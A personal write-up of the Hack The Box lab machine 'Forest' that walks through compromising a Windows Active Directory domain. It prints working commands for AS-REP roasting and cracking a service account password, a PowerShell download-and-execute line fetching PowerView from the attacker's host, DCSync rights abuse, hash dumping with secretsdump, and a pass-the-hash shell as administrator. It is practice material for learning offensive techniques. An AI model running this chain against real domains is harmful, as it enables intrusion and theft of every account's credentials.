---
layout: default
title : muzec - Forest Writeup
---

![image](https://user-images.githubusercontent.com/69868171/125164419-0aed6a80-e18a-11eb-95fd-c80a0c7e9b89.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu Jul  8 10:35:07 2021 as: nmap -sC -sV -oA nmap 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.44s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-08 12:43:38Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h27m46s, deviation: 4h02m31s, median: 3h07m44s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-07-08T05:44:09-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-08T12:44:07
|_  start_date: 2021-07-08T04:47:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  8 10:36:53 2021 -- 1 IP address (1 host up) scanned in 106.43 seconds
```

We have our Nmap scan result but before going deep let try to scan if we have `winrm port` open.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.161]
└─$ nmap -sC -sV -p 5985 10.10.10.161  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 11:27 WAT
Nmap scan report for htb.local (10.10.10.161)
Host is up (0.68s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds
```

Now let start our enumeration on SMB port first.

![image](https://user-images.githubusercontent.com/69868171/125164713-7f74d900-e18b-11eb-99df-2cc1617c25dd.png)

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.161]
└─$ smbclient -L //10.10.10.161/ -N 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Anonymous login successful but got nothing so i decide to enumerate SMB more with `enum4linux` but let first add `htb.local` to our hosts file which is located at `/etc/hosts` .

`enum4linux -a htb.local`

![image](https://user-images.githubusercontent.com/69868171/125164922-a089f980-e18c-11eb-9426-124c19a814e1.png)

![image](https://user-images.githubusercontent.com/69868171/125164956-c2837c00-e18c-11eb-9414-28e9b373a1d5.png)

We have some users also a service account  `svc-alfresco` let try to save all users in a txt file.

```
Administrator
DefaultAccount
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
muzec
cybery
jelly
sheesh
santi
```

If Kerberos pre-authentication is disabled on any of the above accounts, we can use the GetNPUsers impacket script to send a request for authentication KDC which will then return a TGT that is encrypted with the user’s password.

`GetNPUsers.py -dc-ip htb.local htb.local/svc-alfresco -no-pass`

![image](https://user-images.githubusercontent.com/69868171/125165218-f6ab6c80-e18d-11eb-8097-58ce4a097dff.png)


Now that we have the user hash let crack it using `John The Ripper` tools.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.161]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2021-07-10 12:02) 0.1639g/s 669796p/s 669796c/s 669796C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Boom we have the password `s3rvice` now let try using it on WinRM port with `evil-winrm` .

`evil-winrm -i htb.local -u svc-alfresco -p 's3rvice'`

![image](https://user-images.githubusercontent.com/69868171/125165793-733f4a80-e190-11eb-9d8c-2bbd6c4c5c1d.png)

We have `user.txt` cool right.


### System / Administrator

Running `winPEAS` give a bunch of output so i decided to download `SharpHound.exe` and upload it on the target.

![image](https://user-images.githubusercontent.com/69868171/125166147-2a889100-e192-11eb-9227-f3b578e11a1e.png)

Now let run the program.

```
./SharpHound.exe
```

![image](https://user-images.githubusercontent.com/69868171/125166310-f2ce1900-e192-11eb-8bc1-2b512a0046e0.png)

We have two output files we need to download it to our machine.

![image](https://user-images.githubusercontent.com/69868171/125166435-80116d80-e193-11eb-9af0-d1da1fbf14ce.png)

Let download the ZIP file.

![image](https://user-images.githubusercontent.com/69868171/125166482-b64eed00-e193-11eb-9ea5-41e7a3daa40f.png)

Now that we how the zip file on our machine, we need to upload it to BloodHound. If you don’t have BloodHound installed on your machine, use the following command to install it.

```
apt-get install bloodhound
```

We can also download it from github `https://github.com/BloodHoundAD/BloodHound/releases` .

![image](https://user-images.githubusercontent.com/69868171/125166724-d16e2c80-e194-11eb-805c-49040c49a7a9.png)

Now let start up the neo4j database.

```
sudo neo4j console
```

![image](https://user-images.githubusercontent.com/69868171/125166847-843e8a80-e195-11eb-8d4a-67cc7650bfc2.png)


Now let run bloodhound.

```
./BloodHound --no-sandbox
```

![image](https://user-images.githubusercontent.com/69868171/125167031-573ea780-e196-11eb-95b8-bf3d79e05766.png)

Now let log in with our `neo4j` credentials. Now let drag and drop the zip file or upload it into BloodHound. Then set the start node to be the svc-alfresco user.


![image](https://user-images.githubusercontent.com/69868171/125167313-d08aca00-e197-11eb-8568-665f4a361779.png)

Now let right click on the user and select `Mark User as Owned`.

![image](https://user-images.githubusercontent.com/69868171/125167435-632b6900-e198-11eb-8e96-67d94c10e85e.png)

Now we should have a skull head on the user `SVC-ALFRESCO@HTB.LOCAL` . Now time to analyze.

![image](https://user-images.githubusercontent.com/69868171/125168011-42b0de00-e19b-11eb-84ab-e0ac5dbe3280.png)

Select `Analysis` under `Pre-Built Analytics Queries` click on `Shortest Paths to Domain Admins from Owned Principals` and we should have the diagram below.

![image](https://user-images.githubusercontent.com/69868171/125168154-e3070280-e19b-11eb-8b69-34d22192ae08.png)

We can see that `svc-alfresco` is a member of the group `Service Accounts` which is a member of the group `Privileged IT Accounts,` which is a member of `Account Operators.` Moreover, the `Account Operators` group has Generic All permissions on the `Exchange Windows Permissions` group, which has WriteDacl permissions on the domain.

Now let me try and break it down;

1. svc-alfresco is not just a member of Service Accounts, but is also a member of the groups Privileged IT Accounts and Account Operators.
2. The Account Operators group grants limited account creation privileges to a user. Therefore, the user svc-alfresco can create other users on the domain.
3. The Account Operators group has GenericAll permission on the Exchange Windows Permissions group. This permission essentially gives members full control of the group and therefore allows members to directly modify group membership. Since svc-alfresco is a member of Account Operators, he is able to modify the permissions of the Exchange Windows Permissions group.
4. The Exchange Windows Permission group has WriteDacl permission on the domain HTB.LOCAL. This permission allows members to modify the DACL (Discretionary Access Control List) on the domain. We’ll abuse this to grant ourselves DcSync privileges, which will give us the right to perform domain replication and dump all the password hashes from the domain.

Now let list our attack path.

1. Create a user on the domain. This is possible because svc-alfresco is a member of the group Account Operators.
2. Add the user to the Exchange Windows Permission group. This is possible because svc-alfresco has GenericAll permissions on the Exchange Windows Permissions group.
3. Give the user DcSync privileges. This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
4. Perform a DcSync attack and dump the password hashes of all the users on the domain.
5. Perform a Pass the Hash attack to get access to the administrator’s account.

All thanks to Rana Khalil for breaking it down because am also new to Active Directory and using BloodHound.

Now let hit it.

```
net user itmuzec muzec123 /add /domain
```
![image](https://user-images.githubusercontent.com/69868171/125168555-0468ee00-e19e-11eb-9c0e-5792ad3f8f7c.png)

Now let Add the user to to the Exchange Windows Permission group.

```
net group "Exchange Windows Permissions" /add itmuzec
```
![image](https://user-images.githubusercontent.com/69868171/125168611-43973f00-e19e-11eb-87f7-e4187cf10fdf.png)

We need to give the user DCSync privileges we can use PowerView for this. First let download Powerview and setup a python server in the directory it resides in to transfer it.

![image](https://user-images.githubusercontent.com/69868171/125168701-b1436b00-e19e-11eb-8415-22167642c458.png)

```
python -m SimpleHTTPServer
```
Now let download the script on the target.

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.72:8000/PowerView.ps1')
```

Time to abuse it.

```
$SecPassword = ConvertTo-SecureString 'muzec123' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('HTB\itmuzec', $SecPassword)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity itmuzec -Rights DCSync
```

Back to our machine now let run `secretsdump.py` from impacket.

```
secretsdump.py htb.local/itmuzec:muzec123@10.10.10.161
```

![image](https://user-images.githubusercontent.com/69868171/125169026-4004b780-e1a0-11eb-92d1-615b1ace82a1.png)

Confirming the Administrator hash with `crackmapexec` .

```
crackmapexec smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

![image](https://user-images.githubusercontent.com/69868171/125169088-8f4ae800-e1a0-11eb-896c-9491bb7d0654.png)


Boom Now let use `psexec.py` from Impacket to perform a pass the hash attack with the Administrator’s hash.

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![image](https://user-images.githubusercontent.com/69868171/125169229-1ef09680-e1a1-11eb-9cea-87ca9366b67a.png)

We have shell and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
